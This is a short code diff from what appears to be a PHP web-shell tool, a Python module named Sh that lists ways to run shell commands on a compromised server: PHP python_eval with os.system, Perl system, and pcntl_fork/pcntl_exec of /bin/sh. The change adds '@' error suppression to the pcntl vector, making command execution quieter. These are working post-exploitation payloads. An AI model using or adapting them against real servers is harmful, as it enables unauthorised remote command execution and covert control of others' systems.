@@ -50,7 +50,7 @@ class Sh(Module):
                 Vector("@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');", "python_eval"),
                 Vector("if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}'); print($r); }", "perl_system"),
                 # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
-                Vector("""$p=pcntl_fork(); if(!$p){pcntl_exec("/bin/sh",Array("-c","${args['command']}"));} else {pcntl_waitpid($p,$status);}""",
+                Vector("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c","${args['command']}"));} else {@pcntl_waitpid($p,$status);}""",
                     name="pcntl", target=Os.NIX),
             ])
 
